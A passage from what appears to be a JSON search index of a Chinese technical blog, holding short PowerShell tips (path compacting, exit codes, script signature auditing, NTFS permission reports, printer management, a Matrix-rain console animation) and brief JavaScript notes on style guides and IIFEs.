System.Runtime.InteropServices; namespace WindowsAPILib { public class Helper { [DllImport(&quot;shlwapi.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] internal static extern bool PathCompactPathEx(System.Text.StringBuilder pszOut, string pszSrc, Int32 cchMax, Int32 dwFlags); public static string CompactPath(string Path, int DesiredLength) { StringBuilder sb = new StringBuilder(260); if (PathCompactPathEx(sb, Path, DesiredLength + 1, 0)) { return sb.ToString(); } else { return Path; } } } } '@ Add-Type -TypeDefinition $newType 当您执行了该代码，就创建了一个名为 WindowsAPILib 的新的 .NET 类型，从而得到一个新的名为 CompactPath 的新的静态方法。您现在可以这样的使用： PS&gt; $pshome C:\\Windows\\System32\\WindowsPowerShell\\v1.0 PS&gt; [WindowsAPILib.Helper]::CompactPath($pshome, 12) C:\\W...\\v1.0 PS&gt; [WindowsAPILib.Helper]::CompactPath($pshome, 18) C:\\Windows...\\v1.0 PS&gt; [WindowsAPILib.Helper]::CompactPath($pshome, 22) C:\\Windows\\Sys...\\v1.0","link":"/2014/12/26/compacting-paths/"},{"title":"PowerShell 技能连载 - 处理 %ERRORLEVEL%","text":"适用于 PowerShell 所有版本 当您在脚本里运行原生的 EXE 控制台命令，这些命令通常返回一个数字型的返回值。这个值被称为“ErrorLevel”。在批处理文件里，您可以通过 %ERRORLEVEL% 访问这个返回值。 让我们看看 PowerShell 如何获取和存放这个数字型返回值，以及一个 PowerShell 脚本如何返回自己的“ErrorLevel”——它将被 PowerShell 脚本的调用者接收到： ping 1.2.3.4 -n 1 -w 500 $result1 = $LASTEXITCODE ping 127.0.0.1 -n 1 -w 500 $result2 = $LASTEXITCODE $result1 $result2 if ($result1 -eq 0 -and $result2 -eq 0) { exit 0 } else { exit 1 } 在这个例子里，代码中 ping 了两个 IP 地址。第一个调用失败了，第二个调用成功了。该脚本将 $LASTEXITCODE 的返回值保存在两个变量里。 然后它计算出这些返回值的影响结果。在这个例子中，如果所有调用返回 0，PowerShell 脚本将 ErrorLevel 代码设置为 0，否则为 1。 当然，这只是一个简单的例子。您可以配合您自己的原生命令使用。只需要确保调用原生应用程序之后立刻保存 $LASTEXITCODE 值，因为它会被后续的调用覆盖。","link":"/2014/12/29/dealing-with-errorlevel/"},{"title":"PowerShell 技能连载 - 检查 PowerShell 安全性","text":"适用于 PowerShell 2.0 及以上版本 这段代码在指定的驱动器里查找所有 PowerShell 脚本，然后检查这些脚本是否有合法的数字签名，并汇报哪些脚本没有签名，或签名非法： Get-ChildItem C:\\ -Filter *.ps1 -Recurse | Where-Object { $_.Extension -eq '.ps1' } | Get-AuthenticodeSignature | Where-Object { $_.Status -ne 'Valid' } “好吧”，也许您会辩论，“可是我们没有签名证书或 PKI”。这不是问题。数字签名只和信任有关。所以即便是用免费的自签名证书也可以信任。您只需要声明信任谁即可。 相对于依赖需要昂贵的官方代码签名的 Windows “根证书认证”，在您的内部安全审计中，您可以使用类似这样的自制方案： $whitelist = @('D3037720F7E5CF2A9DBA855B65D98C2FE1387AD9', '6262A18EC19996DD521F7BDEAA0E079544B84241') Get-ChildItem y:\\Advanced -Filter *.ps1 -Recurse | Where-Object { $_.Extension -eq '.ps1' } | Get-AuthenticodeSignature | Select-Object -ExpandProperty SignerCertificate | Where-Object { $whitelist -notcontains $_.Thumbprint -or $_.Status -eq 'HashMismatch' } 只需要将任何您信任的证书的唯一的证书指纹添加到白名单中。该证书是否是自签名的并不重要。白名单是最重要的，并且它是您私人的“吊销列表”：如果您不再信任某个证书，或某个证书丢失了，只需要将它的指纹从您的白名单中移除即可。 生成的报告包括所有未使用您的白名单中的证书合法地签名的脚本。如果某个脚本使用白名单中的一个证书签过名，但是后来改变过，它也会出现在报告中。","link":"/2014/12/30/checking-powershell-security/"},{"title":"PowerShell 技能连载 - 改变 GPO 描述&#x2F;备注","text":"需要 GroupPolicy 模块 当您创建了一个新的组策略，您可以设置一个备注（或描述）。然而，没有一种明显的办法来修改这个备注值。 以下这段代码用于获取一个组策略，然后读取并/或修改它的描述。请确保您将“PolicyName”的名称修改为在您环境中实际存在的一个组策略名： Import-Module -Name GroupPolicy $policy = Get-Gpo -Name 'PolicyName' $policy.Description $policy.Description = 'New Description' 请注意只有当您重新打开了组策略客户端工具时，修改的内容才会反映到 UI 中。还请注意您需要 GroupPolicy PowerShell 模块。它随 Microsoft 的 RSAT 工具免费发布。在客户端，GroupPolicy 模块需要在控制面板/程序中启用才可以使用。","link":"/2014/12/31/changing-gpo-description-comment/"},{"title":"PowerShell 技能连载 - 处理隐藏文件","text":"适用于 PowerShell 3.0 及更高版本 当您使用 Get-ChildItem 来列出文件时，缺省情况下不包含隐藏文件。 要包含隐藏文件，请使用 -Force 参数： PS&gt; Get-ChildItem -Path $home -Force 要只列出隐藏文件，请使用 -Hidden 参数。这个参数是在 PowerShell 3.0 引入的： PS&gt; Get-ChildItem -Path $home -Hidden Directory: C:\\Users\\Tobias Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h- 08.01.2012 10:38 AppData d--hs 08.01.2012 10:38 Application Data d--hs 08.01.2012 10:38 Cookies d--hs 08.01.2012 10:38 Local Settings d--hs 08.01.2012 10:38 My Documents d--hs 08.01.2012 10:38 NetHood (...)","link":"/2015/01/01/dealing-with-hidden-files/"},{"title":"PowerShell 技能连载 - 不通过 ProgID 操作 COM 对象","text":"适用于 PowerShell 所有版本 通常在操作 COM 对象时，它们需要将自身在注册表中注册，并且 PowerShell 需要注册的 ProgID 字符串来加载对象。 以下是一个例子： $object = New-Object -ComObject Scripting.FileSystemObject $object.Drives 若不使用 New-Object 命令，您也可以用 .NET 方法来实现相同的目的： $type = [Type]::GetTypeFromProgID('Scripting.FileSystemObject') $object = [Activator]::CreateInstance($type) $object.Drives 采用后一种方法，您甚至可以实例化一个未暴露 ProgID 的 COM 对象。您所需的只是 GUID： $clsid = New-Object Guid '0D43FE01-F093-11CF-8940-00A0C9054228' $type = [Type]::GetTypeFromCLSID($clsid) $object = [Activator]::CreateInstance($type) $object.Drives","link":"/2015/01/02/accessing-com-objects-without-progid/"},{"title":"PowerShell 技能连载 - 查找非继承的权限","text":"适用于 PowerShell 所有版本 通常，文件系统的 NTFS 权限是继承的。然而，您可以显式地为文件和文件夹添加权限。 您可以使用这段示例代码查找何处禁用了继承以及何处添加了权限项目： Get-ChildItem c:\\Windows -Recurse -Directory -ErrorAction SilentlyContinue | Where-Object { (Get-Acl -Path $_.FullName -ErrorAction SilentlyContinue).Access | Where-Object { $_.isInherited -eq $false } } 在这个例子中，Get-ChildItem 在 Windows 文件夹中搜索所有子文件夹。您可以将“C:\\Windows”改为您想测试的任意文件夹。 然后，该脚本读取每个文件夹的安全描述符并查看是否有 isInherited 属性被设为 $false 的存取控制记录。 如果结果为真，该文件夹会汇报给您。","link":"/2015/01/05/finding-explicit-permissions/"},{"title":"PowerShell 技能连载 - 创建 NTFS 安全报告","text":"适用于 PowerShell 所有版本 如果您希望审计您文件系统中的 NTFS 权限，以下是您起步的建议。 这个脚本递归扫描 Windows 目录和子目录。只要将 $Path 替换为其它路径就可以扫描您文件系统的其它路径。 $Path = 'C:\\Windows' Get-ChildItem -Path $Path -Recurse -Directory -ErrorAction SilentlyContinue | ForEach-Object { $result = $_ | Select-Object -Property FullName, ExplicitePermissions, Count, Preview $result.ExplicitePermissions = (Get-Acl -Path $_.FullName -ErrorAction SilentlyContinue).Access | Where-Object { $_.isInherited -eq $false } $result.Count = $result.ExplicitePermissions.Count $result.Preview = $result.ExplicitePermissions.IdentityReference -join ',' if ($result.ExplicitePermissions.Count -gt 0) { $result } } | Out-GridView 该脚本读取每个子文件夹的安全描述符并查找非继承的安全控制项。如果找到了，那么就加这个信息加入文件夹对象。 结果将输出到一个网格视图窗口。如果您移除掉 Out-GridView，那么您会得到类似如下的信息： PS&gt; G:\\ FullName ExplicitePermissions Count Preview -------- -------------------- ----- ------- C:\\windows\\addins {System.Security.Access... 9 CREATOR OWNER,NT AUTHOR... C:\\windows\\AppPatch {System.Security.Access... 9 CREATOR OWNER,NT AUTHOR... C:\\windows\\Boot {System.Security.Access... 8 NT AUTHORITY\\SYSTEM,NT ... C:\\windows\\Branding {System.Security.Access... 9 CREATOR OWNER,NT AUTHOR... C:\\windows\\Cursors {System.Security.Access... 9 CREATOR OWNER,NT AUTHOR... C:\\windows\\de-DE {System.Security.Access... 9 CREATOR OWNER,NT AUTHOR... C:\\windows\\diagnostics {System.Security.Access... 8 NT AUTHORITY\\SYSTEM,NT ... C:\\windows\\Downloaded P... {System.Security.Access... 11 CREATOR OWNER,NT AUTHOR... 您可以将这个例子作为更深入的工具的基础。例如，您可以将缺省受信任者（例如“CREATOR”，或“SYSTEM”）加入一个列表，并从结果中排除这个列表。","link":"/2015/01/06/creating-ntfs-security-report/"},{"title":"PowerShell 技能连载 - 检测 64 位操作系统","text":"适用于 Windows 7/Server 2008 R2 要检测一个脚本是运行在 32 位环境还是 64 位环境是十分简单的：只需要检查指针的大小，看是等于 4 字节还是 8 字节： if ([IntPtr]::Size -eq 8) { '64-bit' } else { '32-bit' } 不过这并不会告诉您操作系统的类型。这是由于 PowerShell 脚本可以在 64 位机器中运行在 32 位进程里。 要检测 OS 类型，请试试这段代码： if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' } 而且，Environment 类也可以检查您的进程类型： if ([Environment]::Is64BitProcess) { '64-bit' } else { '32-bit' }","link":"/2015/01/07/detecting-64-bit-operating-system/"},{"title":"PowerShell 技能连载 - 条件断点","text":"适用于 PowerShell 3.0 及以上版本 PowerShell ISE 只支持行断点：它们的作用是当调试器命中指定的行时，使代码暂停执行。您可以在 PowerShell ISE 中按 F9 来切换行断点。只需要保证脚本已经保存。未保存的脚本（“无标题”）中的断点是无效的。 一个更复杂的做法是使用动态（或称为“条件”）断点。它们并不是关联于某一行上而是和某一种情况有关联。 要在某个变量被赋予一个新值的时候使脚本停下来，请使用这段示例代码（请先保存后执行）： $bp = Set-PSBreakpoint -Variable a -Mode Write -Script $psise.CurrentFile.FullPath $a = 1 $a $a $a = 200 $a Remove-PSBreakpoint -Breakpoint $bp 当您运行它时，PowerShell 调试器将会在 $a 被赋予一个新值的时候暂停脚本执行。 您甚至可以为它绑定一个更复杂的条件。这个例子将只会在对 $a 赋予一个大于 100 的整数值时才使脚本暂停。 $Condition = { if ($a -is [Int] -and $a -gt 100) { break } } $bp = Set-PSBreakpoint -Variable a -Mode Write -Script $psise.CurrentFile.FullPath -Action $Condition $a = 1 $a $a $a = 200 $a Remove-PSBreakpoint -Breakpoint $bp","link":"/2015/01/08/conditional-breakpoints/"},{"title":"PowerShell 技能连载 - 解析 IP 地址（和参数类型）","text":"适用于 PowerShell 2.0 及以上版本 这个例子演示了两件事情：如何限制一个参数为指定的数据类型、如何使用 .NET 方法来将 IP 地址转化为机器名： function Resolve-IPAddress { param ( [IPAddress] $IPAddress ) [Net.DNS]::GetHostByAddress($IPAddress) } 通过为 $IPAddress 参数前附加一个类型（例如“IPAddress”），您可以让 PowerShell 来校验输入数据的合法性。 “System.Net.DNS” .NET 类型提供了许多有用的静态方法供您解析 IP 地址。请注意在 PowerShell 中您不需要为 .NET 类型指定“System”命名空间。如果您愿意，您也可以使用完整的“`System.Net.DNS”全名。 这是您使用了新的 Resolve-IPAddress 函数的效果： PS&gt; Resolve-IPAddress -IPAddress 127.0.0.1 HostName Aliases AddressList -------- ------- ----------- TobiasAir1 {} {127.0.0.1} PS&gt; Resolve-IPAddress -IPAddress 300.200.100.1 Resolve-IPAddress : Cannot process argument transformation on parameter 'IPAddress'. Cannot convert value &quot;300.200.100.1&quot; to type &quot;System.Net.IPAddress&quot;. Error: &quot;An invalid IP address was specified.&quot; At line:1 char:30 + Resolve-IPAddress -IPAddress 300.200.100.1 + ~~~~~~~~~~~~~ + CategoryInfo : InvalidData: (:) [Resolve-IPAddress], ParameterBindin gArgumentTransformationException + FullyQualifiedErrorId : ParameterArgumentTransformationError,Resolve-IPAddres s","link":"/2015/01/09/resolving-ip-addresses-and-parameter-types-too/"},{"title":"PowerShell 技能连载 - 在输出中使用系统的错误颜色","text":"适用于 PowerShell 所有版本 如果您的脚本希望输出警告或错误信息，您可以使用 Write-Warning 或 Write-Error 指令。两个 cmdlet 都会使用缺省的 PowerShell 颜色来显示警告和错误。然而，这两个 cmdlet 也会为您的输出结果套用一个文字模板： PS&gt; Write-Warning -Message 'This is a warning' WARNING: This is a warning PS&gt; Write-Error -Message 'Something went wrong' Write-Error -Message 'Something went wrong' : Something went wrong + CategoryInfo : NotSpecified: (:) [Write-Error], WriteErrorException + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException Write-Error 添加了一堆无意义的异常详细信息，而您所需要的只是错误文本。一个更好的方式是： PS&gt; $host.UI.WriteErrorLine('Something went wrong...') Something went wrong... 警告和错误的颜色可以通过这种方式配置： PS&gt; $host.UI.WriteErrorLine('Something went wrong...') Something went wrong... PS&gt; $host.PrivateData.ErrorBackgroundColor = 'White' PS&gt; $host.UI.WriteErrorLine('Something went wrong...') Something went wrong... PS&gt; $host.PrivateData (...) ErrorForegroundColor : #FFFF0000 ErrorBackgroundColor : #FFFFFFFF WarningForegroundColor : #FFFF8C00 WarningBackgroundColor : #00FFFFFF VerboseForegroundColor : #FF00FFFF VerboseBackgroundColor : #00FFFFFF DebugForegroundColor : #FF00FFFF DebugBackgroundColor : #00FFFFFF (...)","link":"/2015/01/12/using-system-error-colors-for-output/"},{"title":"PowerShell 技能连载 - 映射驱动器","text":"适用于 PowerShell 3.0 及以上版本 要永久地映射一个网络驱动器，请使用 New-PSDrive 加上 -Persist 参数。这个参数使得驱动器在 PowerShell 之外可见。 要真正地创建一个永久的网络驱动器，请确保加上 -Scope Global。如果 New-PSDrive 在全局作用域范围之外运行（例如，在一个脚本中运行），该驱动器只会在脚本运行时出现在文件管理器中。 这个实例代码演示了如何映射一个网络驱动器： New-PSDrive -Name k -PSProvider FileSystem -Root \\\\storage2\\vid -Persist -Scope Global","link":"/2015/01/13/mapping-drives/"},{"title":"PowerShell 技能连载 - 将代码转为大写","text":"适用于 PowerShell 3.0 及以上版本 在 PowerShell ISE 中要将 PowerShell 的代码转为全大写，请选中文本，并按下 CTRL + SHIFT + U。 To turn text to all lowercase letters, press CTRL+U.要将文本转为全小写，请按 CTRL+U。","link":"/2015/01/14/converting-code-to-uppercase/"},{"title":"用 PowerShell 显示 黑客帝国数码雨动画","text":"请在 PowerShell 控制台中执行本脚本 今天在群里看到一个数码雨的课题，试着实现了一下： 【话痨】powershell传教士(1328486072) 12:58:11话说有人用bat写出了数码雨，谁也用powershell写一个，我用powershell写了几个，总感觉不对。【话痨】powershell传教士(1328486072) 12:58:52有人对命令行数码雨，感兴趣么？ 根据传教士的提示，改了一下，避免了闪烁。 实现效果 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111## Prepare the screen$host.UI.RawUI.BackgroundColor = &quot;Black&quot;$host.UI.RawUI.ForegroundColor = &quot;Green&quot;$charSet = '0123456789'.ToCharArray()$width = 75$height = [Console]::WindowHeight$maxStringLength = 7$minStringLength = 2$maxSpaceLength = 20$minSpaceLength = 6$lines = New-Object System.Collections.ArrayList$symbols = @()for ($i = 0; $i -lt $width; $i++) { $symbols += ''}function AddLine([string]$line) { $lines.insert(0, $line) if ($lines.Count -eq $height) { $lines.RemoveAt($lines.Count - 1) }}function ShowFrame() { Write-Host ($lines.ToArray() -join &quot;`n&quot;)}function TryGenerateSymbol() { for ($i = 0; $i -lt $width; $i++) { $column = $symbols[$i] if ($column -eq '') { # initial state, generate spaces $symbols[$i] = New-Object String ' ', (Get-Random -Minimum $minSpaceLength -Maximum $maxSpaceLength) } elseif ($column -eq ' ') { # last space $randomCount = Get-Random -Minimum $minStringLength -Maximum $maxStringLength $chars = Get-Random -InputObject $charSet -Count $randomCount $symbols[$i] = $column + ($chars -join '') } elseif ($column.Length -eq 1) { # last char $symbols[$i] = $column + (New-Object String ' ', (Get-Random -Minimum $minSpaceLength -Maximum $maxSpaceLength)) } }}function UpdateFrame() { TryGenerateSymbol $line = @() for ($i = 0; $i -lt $width; $i++) { $column = $symbols[$i] $line += $column[0] $symbols[$i] = $column.Substring(1, $column.Length - 1) } $line = $line -join '' AddLine $line}try{ $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size $width + 1, $height + 1}catch {}try{ $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size $width + 1, $height + 1} catch {}try{ while($true) { if([Console]::KeyAvailable) { $key = [Console]::ReadKey() if(($key.Key -eq 'Escape') -or ($key.Key -eq 'Q') -or ($key.Key -eq 'C')) { break } } # Clear-Host $host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0,0 UpdateFrame ShowFrame $host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates ` 0,([Console]::WindowHeight - 1) Write-Host -NoNewLine 'Q or ESC to Quit' Start-Sleep -m 100 }}finally{ ## Clean up, display exit screen Clear-Host &quot;`n&quot; &quot; Happy Scripting from PowerShell...&quot; &quot; by Victor.Woo!&quot; &quot;`n`n`n&quot;} 您也可以在这里下载 Matrix.ps1","link":"/2015/01/15/matrix/"},{"title":"PowerShell 技能连载 - 简化 .NET 类型","text":"适用于 PowerShell 所有版本 PowerShell 为多数常见的 .NET 类型定义了一个短名字。要查看已有多少个 .NET 类型定义了短名称，请使用以下代码： PS&gt; [System.Management.Automation.LanguagePrimitives]::ConvertTypeNameToPSTypeName(&quot;System.String&quot;) [string] PS&gt; [System.Management.Automation.LanguagePrimitives]::ConvertTypeNameToPSTypeName(&quot;System.Int32&quot;) [int] PS&gt; [System.Management.Automation.LanguagePrimitives]::ConvertTypeNameToPSTypeName(&quot;System.Management.ManagementObject&quot;) [wmi] PS&gt; [System.Management.Automation.LanguagePrimitives]::ConvertTypeNameToPSTypeName(&quot;System.DirectoryServices.DirectoryEntry&quot;) [adsi] PS&gt; 要查用另一种方法看真实的 .NET 名称，请使用以下方法： PS&gt; [string].FullName System.String PS&gt; [int].FullName System.Int32 PS&gt; [wmi].FullName System.Management.ManagementObject PS&gt; [adsi].FullName System.DirectoryServices.DirectoryEntry PS&gt; 通过这个技巧，您还可以更好地理解 PowerShell 转换数据类型的机制： PS&gt; [System.Management.Automation.LanguagePrimitives]::ConvertTypeNameToPSTypeName(&quot;UInt8&quot;) [Byte] PS&gt; 这表明了，当 PowerShell 遇到一个无符号 8 位整型数值，将自动把它转换为一个 Byte 数据。整个魔法是由 ConvertTypeNameToPSTypeName() 完成的。在内部，PowerShell 使用一个检索表来转换特定的数据类型： $field = [System.Management.Automation.LanguagePrimitives].GetField('nameMap', 'NonPublic,Static') $field.GetValue([System.Management.Automation.LanguagePrimitives]) 该检索表看起来类似这样： Key Value --- ----- SInt8 SByte UInt8 Byte SInt16 Int16 UInt16 UInt16 SInt32 Int32 UInt32 UInt32 SInt64 Int64 UInt64 UInt64 Real32 Single Real64 double Boolean bool String string DateTime DateTime Reference CimInstance Char16 char Instance CimInstance BooleanArray bool[] UInt8Array byte[] SInt8Array Sbyte[] UInt16Array uint16[] SInt16Array int64[] UInt32Array UInt32[] SInt32Array Int32[] UInt64Array UInt64[] SInt64Array Int64[] Real32Array Single[] Real64Array double[] Char16Array char[] DateTimeArray DateTime[] StringArray string[] ReferenceArray CimInstance[] InstanceArray CimInstance[] Unknown UnknownType","link":"/2015/01/15/simplifying-net-types/"},{"title":"PowerShell 技能连载 - 管理打印机","text":"适用于 Windows 8.1 和 Server 2012 R2 Windows 8.1 和 Server 2012 R2 带来了一个叫做“PrintManagement”的模块。它包含了管理本地和远程打印机所需的所有 Cmdlet。 以下是一个示例脚本，演示了安装打印机驱动、设置打印机端口、安装打印机、共享该打印机，以及设置某些打印机属性的过程。 $ComputerName = $env:COMPUTERNAME $DriverName = 'Samsung SCX-483x 5x3x Series XPS' $IPAddress = '192.168.2.107' $PortName = 'NetworkPrint_192.168.2.107' $PrinterName = 'BWPrint' $ShareName = 'Office 12' Add-PrinterDriver -ComputerName $ComputerName -Name $DriverName Add-PrinterPort -Name $PortName -ComputerName $ComputerName Add-Printer -ComputerName $ComputerName -Name $PrinterName -DriverName $DriverName -Shared -ShareName $ShareName -PortName $PortName Set-PrintConfiguration -ComputerName $ComputerName -PrinterName $PrinterName -PaperSize A4 要使用它，请确保您修改了 $IPAddress 并指向一个存在的打印机。请将 $ComputerName 修改指向一个远程计算机而不是您的本地计算机。 要列出 PrintManagement 模块所带的所有 Cmdlet，请试试以下代码： PS&gt; Get-Command -Module PrintManagement CommandType Name ModuleName ----------- ---- ---------- Function Add-Printer PrintManagement Function Add-PrinterDriver PrintManagement Function Add-PrinterPort PrintManagement Function Get-PrintConfiguration PrintManagement Function Get-Printer PrintManagement Function Get-PrinterDriver PrintManagement Function Get-PrinterPort PrintManagement Function Get-PrinterProperty PrintManagement Function Get-PrintJob PrintManagement Function Read-PrinterNfcTag PrintManagement Function Remove-Printer PrintManagement Function Remove-PrinterDriver PrintManagement Function Remove-PrinterPort PrintManagement Function Remove-PrintJob PrintManagement Function Rename-Printer PrintManagement Function Restart-PrintJob PrintManagement Function Resume-PrintJob PrintManagement Function Set-PrintConfiguration PrintManagement Function Set-Printer PrintManagement Function Set-PrinterProperty PrintManagement Function Suspend-PrintJob PrintManagement Function Write-PrinterNfcTag PrintManagement 如您所见，它们实际上是 PowerShell 函数而不是二进制 Cmdlet。","link":"/2015/01/16/managing-printers/"},{"title":"PowerShell 技能连载 - 远程更新组策略","text":"适用于 Windows 8.1 或 Server 2012 R2 要更新远程计算机上的组策略设置，请使用 Invoke-GPUpdate，并且传入希望更新设置的计算机名。 Invoke-GPUpdate 在远程计算机上创建“gpupdate”计划任务。您可以使用 –RandomDelayInMinutes 指定一个 0 至 44640 分钟（31 天）之间的值。该 cmdlet 将使用一个随机的时间因子来避免网络阻塞。","link":"/2015/01/19/remotely-updating-group-policy/"},{"title":"JavaScript 中的坑","text":"AngularJS移动开发中的坑汇总","link":"/2015/01/20/Gochas-in-JavaScript/"},{"title":"JavaScript 编码规范","text":"Google’s JavaScript style guide Mozilla’s JavaScript style guide GitHub’s JavaScript style guide Douglas Crockford’s JavaScript style guide Airbnb JavaScript style guide","link":"/2015/01/20/JavaScript-Style-Guide/"},{"title":"PowerShell 技能连载 - 列出所有打印任务","text":"适用于 Windows 8.1 或 Server 2012 R2 Windows 8.1 和 Server 2012 R2 引入了一个名为“PrintManagement”的模块。它包含了管理本地和远程打印机所需的所有 cmdlet。 要列出指定计算机的所有打印任务，首先确定可用的打印机，然后用循环取出每个打印机的打印任务。这实际做起来十分简单： $ComputerName = $env:COMPUTERNAME Get-Printer -ComputerName $ComputerName | ForEach-Object { Get-PrintJob -PrinterName $_.Name -ComputerName $ComputerName } 如果该代码返回空，那么说明没有打印任务（或者您没有读取它们的权限）。","link":"/2015/01/20/listing-all-print-jobs/"},{"title":"AngularJS 最佳实践","text":"johnpapa/angularjs-styleguide Watch 419 Star 5,141 Fork 569 mgechev/angularjs-style-guide Watch 191 Star 2,625 Fork 313 中文版：README-zh-cn.md turingou/Angular-Best-Practices本repo由支付宝前端开发工程师 @莫登（新浪微博@郭宇）维护，部分案例包括Angular在 支付宝某些系统上的使用经验 Watch 7 Star 21 Fork 6 AngularJS移动开发中的坑汇总 Watch 7 Star 21 Fork 6 AngularJS 最佳实践 – 尘埃落定","link":"/2015/01/21/AngularJS-Best-Practices/"},{"title":"JavaScript 最佳实践","text":"45 Useful JavaScript Tips, Tricks and Best Practices - Modern Web","link":"/2015/01/21/JavaScript-Best-Practices/"},{"title":"PowerShell 技能连载 - 分析并移除打印任务","text":"适用于 Windows 8.1 或 Server 2012 R2 Windows 8.1 和 Server 2012 R2 引入了一个名为“PrintManagement”的模块。它包含了管理本地和远程打印机所需的所有 cmdlet。 在前一个技能中我们演示了如何读取打印任务。每个打印任务都有一个 JobStatus 属性告诉您该 PrintJob 是否成功完成。 可以通过这种方式获取所有的状态码： PS&gt; Import-Module PrintManagement PS&gt; [Microsoft.PowerShell.Cmdletization.GeneratedTypes.PrintJob.JobStatus]::GetNames([Microsoft.PowerShell.Cmdletization.GeneratedTypes.PrintJob.JobStatus]) Normal Paused Error Deleting Spooling Printing Offline PaperOut Printed Deleted Blocked UserIntervention Restarted Complete Retained RenderingLocally 接下来，您可以过滤已有的打印任务。并且，比如打印出所有已完成或有错误的打印任务。这段代码将列出所有有错误或已完成的打印任务： $ComputerName = $env:COMPUTERNAME Get-Printer -ComputerName $ComputerName | ForEach-Object { Get-PrintJob -PrinterName $_.Name -ComputerName $ComputerName | Where-Object { $_.JobStatus -eq 'Complete' -or $_.JobStatus -eq 'Error' -or $_.JobStatus -eq 'Printed'} } 要移除这些打印任务，只需要加上 Remove-PrintJob 命令： $ComputerName = $env:COMPUTERNAME Get-Printer -ComputerName $ComputerName | ForEach-Object { Get-PrintJob -PrinterName $_.Name -ComputerName $ComputerName | Where-Object { $_.JobStatus -eq 'Complete' -or $_.JobStatus -eq 'Error' -or $_.JobStatus -eq 'Printed'} } | Remove-PrintJob -CimSession $ComputerName","link":"/2015/01/21/analyzing-and-removing-print-jobs/"},{"title":"JavaScript 中的匿名函数和立即执行函数","text":"命名函数123function foo() {} 这种写法和 C 语言中定义一个函数的写法差不多。 匿名函数 + 赋值语句123var bar = function() {}; 例子中变量 bar 指向一个匿名函数。由于这是一个赋值语句，所以应该以 ; 结尾。虽然分号可以省略。 命名函数 + 赋值语句123var bar = function foo() {}; 此处的 foo 可以省略，不会影响代码逻辑。但是加上 foo 在调试工具中查看调用堆栈时，可以更清晰地看到函数的名称。所以这是一个推荐的实践。 立即执行函数 (IIFE)123(function() {}()); 还有一种变体： 123(function() {})(); 请注意上述两种写法的圆括号的位置区别。前一种写法是 JSLint 推荐的写法，所以推荐采用第一种写法。 这种模式本质上只是一个函数表达式（无论是命名或匿名的），该函数会在创建后立刻执行。以下是用命名函数来实现 IIFE 的例子： 123(function foo() { var bar = 1;}()); 代码中用 foo 作为 IIFE 的名字。 这种模式是非常有用的，因为它为初始化代码提供了一个作用于沙箱(sandbox)。代码中的 bar 变量此时会成为一个局部变量，不会污染全局的 window (global) 对象。","link":"/2015/01/22/Anonymous-Function-and-IIFE-in-JavaScript/"},{"title":"PowerShell 技能连载 - 要求管理员权限","text":"适用于 PowerShell 4.0 及以上版本 如果您知道某个脚本需要管理员权限，只需要一个简单的 #requres 语句就可以确保符合该需求的才可以运行： #requires -version 4.0 #requires –runasadministrator 'I am Admin!' 如果这个脚本没有使用管理员身份运行，它将显示一个有意义错误提示信息，说明它为何无法运行。 实际上，在这个例子中您可以看到两条 #requires 语句。第一条确保该脚本至少运行在 PowerShell 4.0 以上的环境中，这是第二条 #requires 的先决条件。它是由 PowerShell 4.0 引入的，不支持 PowerShell 更低的版本。 所以最好不要在 PowerShell 3.0 或更早的环境中使用这个技术。在那些环境中，您还是需要手工确认脚本是否拥有管理员权限。","link":"/2015/01/22/requiring-administrator-privileges/"},{"title":"PowerShell 技能连载 - 读取多行文本","text":"适用于 PowerShell 3.0 及以上版本 有些时候您偶然会见到类似这样的技巧： $FilePath = &quot;$env:SystemRoot\\WindowsUpdate.log&quot; $ContentsWithLinebreaks = (Get-Content $FilePath) -join &quot;`r`n&quot; 您能否出猜出它的用意？Get-Content 缺省情况下返回由一行一行组成的字符串数组，然后 -join 操作符将该数组转化为一个字符串。 从 PowerShell 3.0 开始，Get-Content 多了一个参数：-Raw。它比起刚才的方法高效的多，并且可以得到相同的结果： $FilePath = &quot;$env:SystemRoot\\WindowsUpdate.log&quot; $ContentsWithLinebreaks = (Get-Content $FilePath) -join &quot;`r`n&quot; $ContentsWithLinebreaks2 = Get-Content $FilePath -Raw $ContentsWithLinebreaks -eq $ContentsWithLinebreaks2 当您使用这段代码时，会发现 $ontentWithLinebreaks 和 $ContentWithLinebreaks2 是不同的。唯一的区别是在 $ContentsWithLinebreaks2 尾部有一个换行符： PS&gt; $ContentsWithLinebreaks -eq $ContentsWithLinebreaks2.TrimEnd(&quot;`r`n&quot;) True PS&gt;","link":"/2015/01/23/reading-multiline-text/"},{"title":"PowerShell 技能连载 - 用 Cmdlet 来管理 MSI 安装包","text":"适用于 PowerShell 2.0 及以上版本 需要管理 MSI 安装包的朋友可以从这个开源项目中受益：http://psmsi.codeplex.com/。 只需要下载 PowerShell 模块——它自己包含了一个安装包。请确保在安装它之前对 MSI 文件进行解锁。否则，Windows 可能会拒绝安装它。 不幸的是，这个模块将它自己安装到一个很特殊的地方(AppData\\Local\\Apps...)，并且扩展了 $env:PSModulePath 环境变量，所以 PowerShell 可以找到这个模块。这是为什么您在安装完模块之后需要重启 PowerShell 的原因，因为 PowerShell 不能自动感知到 $env:PSModulePath 发生了改变。 这是获取新的 MSI 相关 cmdlet 的方法： PS&gt; Get-Command -Module MSI CommandType Name ModuleName ----------- ---- ---------- Function Get-MSIComponentState MSI Function Get-MSISharedComponentInfo MSI Function Install-MSIAdvertisedFeature MSI Cmdlet Add-MSISource MSI Cmdlet Clear-MSISource MSI Cmdlet Edit-MSIPackage MSI Cmdlet Export-MSIPatchXml MSI Cmdlet Get-MSIComponentInfo MSI Cmdlet Get-MSIFeatureInfo MSI Cmdlet Get-MSIFileHash MSI Cmdlet Get-MSIFileType MSI Cmdlet Get-MSILoggingPolicy MSI Cmdlet Get-MSIPatchInfo MSI Cmdlet Get-MSIPatchSequence MSI Cmdlet Get-MSIProductInfo MSI Cmdlet Get-MSIProperty MSI Cmdlet Get-MSIRelatedProductInfo MSI Cmdlet Get-MSISource MSI Cmdlet Get-MSISummaryInfo 